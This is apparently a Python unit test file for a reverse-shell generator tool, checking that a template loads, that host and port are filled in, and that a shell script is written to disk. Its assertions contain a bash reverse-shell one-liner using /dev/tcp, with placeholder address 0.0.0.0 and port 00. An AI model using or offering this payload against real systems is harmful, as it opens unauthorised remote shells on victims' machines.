import unittest
import os
from script_tools import shell_manager
from exceptions import exceptions
class Test_Shell_Manager(unittest.TestCase):
    @classmethod
    def setUp(cls):
        cls.shell_path = "shells/bash_reverse_shell.txt"
        cls.ip = "0.0.0.0"
        cls.port = "00"
        cls.file_path = "tests/test_reverse_shell.sh"
    def test_load_shell(self):
        self.assertEqual(shell_manager.load_shell(self.shell_path), "#!/usr/bin/bash\n\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1")

    def test_inject(self):
        self.assertEqual(shell_manager.inject(shell_manager.load_shell(self.shell_path), self.ip, self.port), "#!/usr/bin/bash\n\nbash -i >& /dev/tcp/0.0.0.0/00 0>&1")

    def test_generate_file(self):
        shell_manager.generate_shell(self.file_path, shell_manager.inject(shell_manager.load_shell(self.shell_path), self.ip, self.port))
        self.assertEqual(os.path.isfile(self.file_path), True)
        self.assertEqual(shell_manager.load_shell(self.file_path), "#!/usr/bin/bash\n\nbash -i >& /dev/tcp/0.0.0.0/00 0>&1")

